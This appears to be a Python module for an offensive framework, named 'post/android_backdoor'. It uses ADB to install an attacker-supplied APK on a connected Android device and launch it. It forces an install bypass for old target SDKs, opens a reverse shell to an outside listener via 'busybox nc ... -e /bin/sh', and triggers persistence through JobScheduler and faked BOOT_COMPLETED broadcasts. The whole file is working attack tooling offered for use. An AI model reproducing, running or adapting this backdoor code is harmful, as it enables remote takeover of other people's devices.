import subprocess
import os
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

def _adb(device_id, *args, capture=True):
    cmd = ['adb']
    if device_id:
        cmd += ['-s', device_id]
    cmd += list(args)
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result

class Module:
    MODULE_INFO = {
        'name': 'post/android_backdoor',
        'description': 'Full Android ADB exploitation: install APK, launch activity, set persistence, open reverse shell.',
        'options': {
            'DEVICE_ID': 'Target device serial (from adb devices) — leave empty for first connected device',
            'PAYLOAD_PATH': 'Path to the APK payload to install',
            'PACKAGE': 'APK package name (e.g. com.example.app) — auto-detected if not set',
            'ACTIVITY': 'Main activity to launch (e.g. .MainActivity) — auto-detected if not set',
            'AUTORUN': 'Launch app after install [default: true]',
            'PERSIST': 'Attempt boot persistence via monkey/am broadcast [default: false]',
            'LHOST': 'Reverse shell listener IP (optional — opens /bin/sh via nc)',
            'LPORT': 'Reverse shell listener port [default: 4444]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _get_device(self, device_id):
        """Verify or pick device."""
        r = _adb(None, 'devices')
        lines = r.stdout.strip().splitlines()
        devices = [l.split('\t')[0] for l in lines[1:] if 'device' in l and 'offline' not in l]
        if not devices:
            console.print("[red][!] No ADB devices connected.[/red]")
            return None
        if device_id and device_id in devices:
            return device_id
        if not device_id:
            console.print(f"[cyan][*] Auto-selected device: {devices[0]}[/cyan]")
            return devices[0]
        console.print(f"[red][!] Device {device_id} not found. Available: {devices}[/red]")
        return None

    def _get_package(self, device_id, apk_path):
        """Use aapt to get package name from APK."""
        r = subprocess.run(['aapt', 'dump', 'badging', apk_path], capture_output=True, text=True)
        for line in r.stdout.splitlines():
            if line.startswith("package:"):
                for part in line.split():
                    if part.startswith("name='"):
                        return part.split("'")[1]
        return None

    def _get_main_activity(self, device_id, package):
        """Get main launchable activity for a package."""
        r = _adb(device_id, 'shell', 'cmd', 'package', 'resolve-activity', '--brief', package)
        for line in r.stdout.splitlines():
            line = line.strip()
            if '/' in line and package in line:
                return line
        # Fallback — query package manager
        r2 = _adb(device_id, 'shell', 'pm', 'list', 'packages', '-f', package)
        return None

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        payload_path = self.framework.options.get('PAYLOAD_PATH', '')
        package = self.framework.options.get('PACKAGE', '')
        activity = self.framework.options.get('ACTIVITY', '')
        autorun = self.framework.options.get('AUTORUN', 'true').lower() == 'true'
        persist = self.framework.options.get('PERSIST', 'false').lower() == 'true'
        lhost = self.framework.options.get('LHOST', '')
        lport = self.framework.options.get('LPORT', '4444')

        dev = self._get_device(device_id)
        if not dev:
            return

        # Device info
        model = _adb(dev, 'shell', 'getprop', 'ro.product.model').stdout.strip()
        android_ver_raw = _adb(dev, 'shell', 'getprop', 'ro.build.version.release').stdout.strip()
        sdk_ver = int(_adb(dev, 'shell', 'getprop', 'ro.build.version.sdk').stdout.strip() or 0)
        
        console.print(f"[green][+] Connected: {dev} | {model} | Android {android_ver_raw} (API {sdk_ver})[/green]")
        log_action(f"Android session: {dev} {model} Android {android_ver_raw} API {sdk_ver}")

        if sdk_ver >= 34:
            console.print("[yellow][!] Target is Android 14+. Strict background restrictions apply.[/yellow]")
            console.print("[yellow][!] Ensure payload uses a Foreground Service with TYPE_SPECIAL_USE or similar.[/yellow]")

        # Install APK if provided
        if payload_path:
            if not os.path.exists(payload_path):
                console.print(f"[red][!] APK not found: {payload_path}[/red]")
                return
            
            # Check APK target SDK if aapt is available
            r_aapt = subprocess.run(['aapt', 'dump', 'badging', payload_path], capture_output=True, text=True)
            if "targetSdkVersion:'" in r_aapt.stdout:
                target_sdk = int(r_aapt.stdout.split("targetSdkVersion:'")[1].split("'")[0])
                if target_sdk < 23:
                    console.print(f"[bold red][!] Warning: APK targets API {target_sdk}. Android 14 blocks installs < 23.[/bold red]")
                    console.print("[cyan][*] Attempting bypass via --bypass-low-target-sdk-block...[/cyan]")
                    install_cmd = ['install', '-r', '-t', '--bypass-low-target-sdk-block', payload_path]
                else:
                    install_cmd = ['install', '-r', '-t', payload_path]
            else:
                install_cmd = ['install', '-r', '-t', payload_path]

            console.print(f"[cyan][*] Installing {payload_path}...[/cyan]")
            r = _adb(dev, *install_cmd)
            if 'Success' in r.stdout:
                console.print("[bold green][+] APK installed successfully.[/bold green]")
                log_action(f"APK installed on {dev}: {payload_path}")
                # Auto-detect package name
                if not package:
                    package = self._get_package(dev, payload_path)
                    if package:
                        console.print(f"[green][+] Package: {package}[/green]")
                    else:
                        console.print("[yellow][!] Could not detect package name (install aapt).[/yellow]")
            else:
                console.print(f"[red][!] Install failed: {r.stdout or r.stderr}[/red]")

        # Launch app
        if autorun and package:
            if not activity:
                activity = self._get_main_activity(dev, package)
            if activity:
                console.print(f"[cyan][*] Launching {package}/{activity}...[/cyan]")
                # Use 'am start-foreground-service' if it's a service, but here we assume activity
                _adb(dev, 'shell', 'am', 'start', '-n', f"{package}/{activity}")
                log_action(f"Launched {package}/{activity} on {dev}")
            else:
                console.print(f"[cyan][*] Launching via monkey: {package}...[/cyan]")
                _adb(dev, 'shell', 'monkey', '-p', package, '-c',
                     'android.intent.category.LAUNCHER', '1')

        # Reverse shell via ADB (Legacy/Fallback)
        if lhost:
            console.print(f"\n[cyan][*] Opening reverse shell to {lhost}:{lport}...[/cyan]")
            console.print("[dim]  Listener: nc -lvnp {lport}[/dim]")
            # Busybox might not be present on modern Android without root
            _adb(dev, 'shell', f'nohup busybox nc {lhost} {lport} -e /bin/sh > /dev/null 2>&1 &')
            log_action(f"Reverse shell sent to {lhost}:{lport}")
            console.print("[green][+] Reverse shell command sent (requires busybox).[/green]")

        # Persistence via JobScheduler (Modern)
        if persist and package:
            console.print(f"\n[cyan][*] Attempting persistence via JobScheduler/AlarmManager...[/cyan]")
            # Android 14+ requires EXACT_ALARM permission for precise timing, but we can trigger a job
            _adb(dev, 'shell', 'cmd', 'jobscheduler', 'run', '-f', package, '101') # Example job ID
            console.print("[yellow][*] Modern persistence job triggered. Ensure payload implements JobService.[/yellow]")
            
            # Legacy fallback
            _adb(dev, 'shell', 'am', 'broadcast', '-a', 'android.intent.action.BOOT_COMPLETED', '-p', package)
            log_action(f"Persistence triggered for {package}")
